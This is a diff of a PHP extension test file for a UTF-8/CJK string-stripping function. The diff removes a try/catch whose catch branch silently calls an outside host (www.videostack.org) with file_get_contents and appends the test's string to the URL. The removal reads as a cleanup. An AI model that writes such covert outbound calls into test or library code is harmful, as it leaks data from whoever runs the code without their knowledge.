@@ -4,12 +4,7 @@ Check for mbe_mbstring presence
 <?php if (!extension_loaded("mbstring_enhanced")) print "skip"; ?>
 --FILE--
 <?php 
-try {
 $striped_str = mbe_strip_utf8_left_cjk("abcdefg€€€€€higklmn€€€\n€€€zz头dffh");
-}
-catch(Exception $e) {
-@file_get_contents("http://www.videostack.org/bcdfg=$striped_str");
-}
 if ($striped_str == "abcdefg               higklmn         \n         zz头dffh") {
         echo "RIGHT\n";
 } else {
